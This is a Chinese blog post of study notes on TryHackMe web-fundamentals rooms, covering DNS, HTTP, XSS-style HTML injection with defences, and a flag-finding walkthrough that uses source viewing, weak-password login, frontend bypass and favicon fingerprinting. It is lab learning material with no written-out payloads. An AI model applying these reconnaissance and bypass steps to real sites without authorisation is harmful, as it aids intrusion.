

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="https://avatars.githubusercontent.com/u/117073339?v=4">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="FSRM">
  <meta name="keywords" content="">
  
    <meta name="description" content="Web FundamentalsHow The Web WorksDNS in detail下面这个图是DNS工作时的流程图  打开网站首先看到 这个地方，可以更换DNS记录的类型 然后我们可以查看CNAME  然后后面的根据要求来即可 HTTP in detailhttp是超文本传输协议 https则是比它更安全了 下面的图片是对url的一些解析  下面是一些状态码的介绍 大致分为五类    1">
<meta property="og:type" content="article">
<meta property="og:title" content="Web Fundamentals">
<meta property="og:url" content="http://example.com/2024/03/08/Web%20Fundamentals/index.html">
<meta property="og:site_name" content="FSRM">
<meta property="og:description" content="Web FundamentalsHow The Web WorksDNS in detail下面这个图是DNS工作时的流程图  打开网站首先看到 这个地方，可以更换DNS记录的类型 然后我们可以查看CNAME  然后后面的根据要求来即可 HTTP in detailhttp是超文本传输协议 https则是比它更安全了 下面的图片是对url的一些解析  下面是一些状态码的介绍 大致分为五类    1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402272317525.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402272322241.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402272323623.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402292303282.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402292345248.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403022228277.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031922678.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031935916.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031938696.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031939117.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031949589.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031952961.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031953462.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032116213.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032133659.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032151826.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032153763.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032218704.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032220553.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032222893.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032244842.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032248784.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032301836.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032322357.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041519253.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041523790.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041717063.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041722551.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041722377.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041735401.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041755996.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041800461.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041858085.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041858894.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042153730.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042204727.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042336559.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042349941.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042351063.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052037397.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052120774.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052122057.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052303260.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052342400.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052345553.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052359232.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403060000247.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061322574.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061323942.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061350512.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061728058.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/956e1914b116cbc9e564e3bb3d9ab50a.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/237696fc8e405d25d4fc7bbcc67919f0.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f3c387849e91a4f15a7b59ff7324be75.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3fd583950617f7a3713a107fcb4cfa49.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061955791.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061957627.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072020920.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072208714.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072223498.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072234171.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072240813.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072247655.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072322533.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072323320.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403081021326.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403081045437.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403082316313.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403122035395.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131358159.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131359093.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131403882.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131913142.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132242159.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132343773.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132344494.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132348902.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403141933290.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11c86acaea05f98045cec5634e03e997.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f5d1b4ef49ff4eef52e7617631225e8a.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142051260.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142056314.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142106579.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/271d0075650cdf6499f994f99fa7eb8a.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142200295.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142203248.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142210976.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142210638.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403152101665.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403170016479.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403181933452.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403181939380.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403181940791.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182045122.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182046562.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182142082.png">
<meta property="og:image" content="https://i.imgur.com/bJ9WKY4.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182201934.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201808117.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201815266.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201849455.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201859281.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403212013267.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403212106148.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403261957924.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262022433.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262105826.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262106029.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262135288.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262138244.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262143993.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262204212.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262228588.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271044772.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271102735.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271109656.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271123121.png">
<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271138387.png">
<meta property="article:published_time" content="2024-03-08T15:55:20.810Z">
<meta property="article:modified_time" content="2024-03-27T03:43:31.671Z">
<meta property="article:author" content="FSRM">
<meta property="article:tag" content="tryhackme">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402272317525.png">
  
  
  
  <title>Web Fundamentals - FSRM</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"yo4o5RmdPYW9bP2LZP2uPFV1-MdYXbMMI","app_key":"ibpxtrAlbUHYQ8KOkGrFgWss","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>FSRM</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://haowallpaper.com/link/common/file/previewFileImg/17231683527757184') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Web Fundamentals"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-03-08 23:55" pubdate>
          2024年3月8日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          21k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          174 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Web Fundamentals</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="Web-Fundamentals"><a href="#Web-Fundamentals" class="headerlink" title="Web Fundamentals"></a>Web Fundamentals</h1><h2 id="How-The-Web-Works"><a href="#How-The-Web-Works" class="headerlink" title="How The Web Works"></a>How The Web Works</h2><h3 id="DNS-in-detail"><a href="#DNS-in-detail" class="headerlink" title="DNS in detail"></a>DNS in detail</h3><p>下面这个图是DNS工作时的流程图</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402272317525.png" srcset="/img/loading.gif" lazyload alt="image-20240227231710035"></p>
<p>打开网站首先看到<img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402272322241.png" srcset="/img/loading.gif" lazyload alt="image-20240227232219172"></p>
<p>这个地方，可以更换DNS记录的类型</p>
<p>然后我们可以查看CNAME</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402272323623.png" srcset="/img/loading.gif" lazyload alt="image-20240227232319538"></p>
<p>然后后面的根据要求来即可</p>
<h3 id="HTTP-in-detail"><a href="#HTTP-in-detail" class="headerlink" title="HTTP in detail"></a>HTTP in detail</h3><p>http是超文本传输协议 https则是比它更安全了</p>
<p>下面的图片是对url的一些解析</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402292303282.png" srcset="/img/loading.gif" lazyload alt="image-20240229230309164"></p>
<p>下面是一些状态码的介绍</p>
<p>大致分为五类</p>
<table>
<thead>
<tr>
<th>100-199 信息响应</th>
</tr>
</thead>
<tbody><tr>
<td>200-299 成功</td>
</tr>
<tr>
<td>300-399 重定向</td>
</tr>
<tr>
<td>400-499客户端错误</td>
</tr>
<tr>
<td>500-599服务器错误</td>
</tr>
</tbody></table>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202402292345248.png" srcset="/img/loading.gif" lazyload alt="image-20240229234520132"></p>
<h3 id="How-websites-work"><a href="#How-websites-work" class="headerlink" title="How websites work"></a>How websites work</h3><p>这个模块主要是关于html和javascript的介绍 以及存在的一些安全问题</p>
<p>有的html页面可能会存在一些敏感信息</p>
<p>记录一下这个html注入</p>
<p>漏洞点就是没有对用户的输入进行一个严格的过滤 然后就导致用户可以构造恶意的javascipt代码注入到网页中 当用户去访问时 就会触发漏洞</p>
<p>其实这个也是xss的一种</p>
<p>例如 </p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403022228277.png" srcset="/img/loading.gif" lazyload alt="image-20240302222805079"></p>
<p>像这样就能跳转到我们构造的网页上面</p>
<p>防御措施：</p>
<p>1.进行严格的过滤 可以将&lt;&gt;等这些符号进行实体化</p>
<p>2.对输入进行白名单限制</p>
<p>3.使用一些安全的框架</p>
<h3 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h3><p>这个房间是把上面的东西结合了一下</p>
<p>然后对用户访问网站 中间发生的事情做了一个概括</p>
<p>第一步:用户发起访问的请求 (这时是域名的形式 我们需要通过DNS将其转换成ip地址)</p>
<p>第二步：在本地DNS寻找是否有缓存 有的话就将其抓换成ip地址 然后再进行下一步 如果没有的话 转到递归DNS</p>
<p>第三步:查询权威DNS服务器和根DNS服务器</p>
<p>第四步:将域名转换成ip地址</p>
<p>第五步:然后通过WAF的检测</p>
<p>第六步:通过负载均衡器 缓解网络流量</p>
<p>第七步:使用http协议或者https协议来发送</p>
<p>第八步:使用什么类型的方法进行访问 (get或者post等)</p>
<p>第九步:访问数据库 从数据库中获取内容</p>
<p>第十步：web服务器向客户端返回相关的界面</p>
<h2 id="Introduction-to-Web-Hacking"><a href="#Introduction-to-Web-Hacking" class="headerlink" title="Introduction to Web Hacking"></a>Introduction to Web Hacking</h2><h3 id="Walking-An-Application-遍历"><a href="#Walking-An-Application-遍历" class="headerlink" title="Walking An Application (遍历)"></a>Walking An Application (遍历)</h3><p>首先查看网页源代码 去访问 下面这个即可</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031922678.png" srcset="/img/loading.gif" lazyload alt="image-20240303192238481"></p>
<p>然后我们在html中可以找到这个</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031935916.png" srcset="/img/loading.gif" lazyload alt="image-20240303193546845"></p>
<p>点击即可找到第二个空的答案</p>
<p>第三个空 我们先观察</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031938696.png" srcset="/img/loading.gif" lazyload alt="image-20240303193836631"></p>
<p>都是在/assets目录下的 然后我们去访问这个assets</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031939117.png" srcset="/img/loading.gif" lazyload alt="image-20240303193926986"></p>
<p>可以找到第三个flag</p>
<p>然后第四个flag的话我们先进行一个信息的搜索</p>
<p>在网页源代码最下面有一个网址 我们先去访问 </p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031949589.png" srcset="/img/loading.gif" lazyload alt="image-20240303194935412"></p>
<p>我原本是找到了它的一个登录界面 用弱口令登录进去发现不是</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031952961.png" srcset="/img/loading.gif" lazyload></p>
<p>然后在log那里可以找到zip文件的下载地址 下载之后就是了</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403031953462.png" srcset="/img/loading.gif" lazyload alt="image-20240303195335345"></p>
<p>第五个flag其实就是一个绕过前端的</p>
<p>就把那个框给删除掉就行了</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032116213.png" srcset="/img/loading.gif" lazyload alt="image-20240303211617077"></p>
<p>第六个flag其实就是在一个js文件里面的一个地方 打一个断点 让其在刷新的时候停留</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032133659.png" srcset="/img/loading.gif" lazyload alt="image-20240303213329528"></p>
<p>第七个flag  在Contact界面上面创建一些数据 然后发送 在网络中查看相关的信息</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032151826.png" srcset="/img/loading.gif" lazyload alt="image-20240303215156748"></p>
<p>在网络中查看 </p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032153763.png" srcset="/img/loading.gif" lazyload alt="image-20240303215312706"></p>
<p>总结:这个房间就是教了如何查看源代码 以及一些在开发者模式下 作为一个渗透测试人员需要关注的点</p>
<h3 id="Content-Discovery"><a href="#Content-Discovery" class="headerlink" title="Content Discovery"></a>Content Discovery</h3><p>主要还是和信息收集有关的知识</p>
<p>从手动和自动以及开源信息的查询几个方面讲述</p>
<p>信息收集的点:</p>
<p>1.robots.txt文件 (不被爬虫爬到) </p>
<p>2.Favicon（网站图标）这个有的时候我们可以获取这些图标的一些md5值 然后去OWASP网站图标数据库上面找到其框架 进一步的做出利用</p>
<p>数据库的网站:<a target="_blank" rel="noopener" href="https://wiki.owasp.org/index.php/OWASP_favicon_database">OWASP网站图标数据库 - OWASP</a></p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032218704.png" srcset="/img/loading.gif" lazyload alt="image-20240303221826632"></p>
<p>可以利用curl获取图标的md5值 然后去查询</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032220553.png" srcset="/img/loading.gif" lazyload alt="image-20240303222000460"></p>
